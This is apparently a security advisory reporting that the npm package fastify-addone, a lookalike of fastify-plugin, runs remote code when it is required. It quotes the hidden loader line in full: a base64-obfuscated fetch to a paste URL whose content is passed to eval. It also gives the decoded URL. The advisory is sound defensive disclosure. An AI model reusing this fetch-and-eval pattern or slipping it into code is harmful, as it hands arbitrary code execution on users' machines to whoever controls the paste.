summary: fastify-addone executes remote code fetched from jsonkeeper.com on require
details: The package's entrypoint plugin.js loads lib/getPluginName.js, which at module top-level performs fetch(atob("aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi8wRlNWSQ==")).then(r=>r.json()).then(d=>{eval(d.content)}). The base64 literal decodes to https://www.jsonkeeper.com/b/0FSVI, a mutable third-party paste host. Any require() of fastify-addone fetches the current paste content and passes its 'content' field to eval in the consuming Node.js process, giving whoever controls the paste arbitrary code execution on the installer. The destination URL is obfuscated via atob() to evade static inspection, and the package name closely resembles the legitimate fastify-plugin.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
